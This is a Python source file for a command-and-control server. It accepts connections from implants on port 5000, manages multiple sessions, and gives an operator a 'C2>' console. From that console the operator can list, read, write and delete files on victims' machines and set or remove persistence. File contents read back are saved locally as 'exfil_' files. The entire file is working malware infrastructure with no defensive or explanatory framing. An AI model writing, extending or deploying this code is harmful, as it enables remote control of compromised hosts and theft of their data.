import socket
import threading
import queue
import os

HOST = '0.0.0.0'
PORT = 5000

command_list_str = """
Command list:
    00: exit
    01: list dir
    02: write file
    03: read file
    04: delete file
    05: persist
    06: unpersist
    07: pwd

"""

sessions = {}
session_id_counter = 0
lock = threading.Lock()

class Session:
    def __init__(self, sid, conn, addr):
        self.sid = sid
        self.conn = conn
        self.addr = addr
        self.cmd_queue = queue.Queue()
        self.thread = threading.Thread(target=self.run, daemon=True)
        self.thread.start()

    def run(self):
        print(f"[+] Session #{self.sid} from {self.addr}")
        while True:
            try:
                cmd_hex, arg = self.cmd_queue.get()
                if cmd_hex == "exit":
                    self.conn.sendall(b'\x00')
                    print(f"[*] Session #{self.sid} terminated.")
                    break
                else:
                    cmd = bytes.fromhex(cmd_hex[:2])
                    self.conn.sendall(cmd + arg.encode())

                    data = self.conn.recv(8192)
                    output = data.decode(errors="ignore")
                    print(f"\n[Session {self.sid} Result]\n{output}")

                    if cmd == b'\x03':  # readfile
                        fname = arg if arg else f"readfile_{self.sid}.txt"
                        with open(f"exfil_{fname}", "w", encoding="utf-8") as f:
                            f.write(output)
                        print(f"[+] Output saved to exfil_{fname}")
            except Exception as e:
                print(f"[!] Session #{self.sid} error: {e}")
                break

        with lock:
            del sessions[self.sid]
        self.conn.close()

def accept_loop():
    global session_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        with lock:
            sid = session_id_counter
            session_id_counter += 1
            sessions[sid] = Session(sid, conn, addr)

def shell():
    print("Available commands:\n - sessions\n - interact <id>\n - exit")
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            if not sessions:
                print("[-] No active sessions.")
            for sid, s in sessions.items():
                print(f"#{sid} from {s.addr}")
        elif cmd.startswith("interact "):
            try:
                sid = int(cmd.split()[1])
                if sid not in sessions:
                    print("[-] Invalid session ID.")
                    continue

                while True:
                    print(command_list_str)
                    cmd_hex = input(f"(session {sid}) Command (01,02,03,00=exit, bg): ").strip()
                    if cmd_hex in ["bg", ""]:
                        break
                    arg = input("Arg: ").strip()
                    if cmd_hex == "00":
                        sessions[sid].cmd_queue.put(("exit", ""))
                        break
                    sessions[sid].cmd_queue.put((cmd_hex, arg))
            except Exception as e:
                print(f"[!] Error: {e}")
        elif cmd == "exit":
            print("[*] Exiting.")
            os._exit(0)
        else:
            print("[?] Unknown command.")

if __name__ == "__main__":
    threading.Thread(target=accept_loop, daemon=True).start()
    shell()
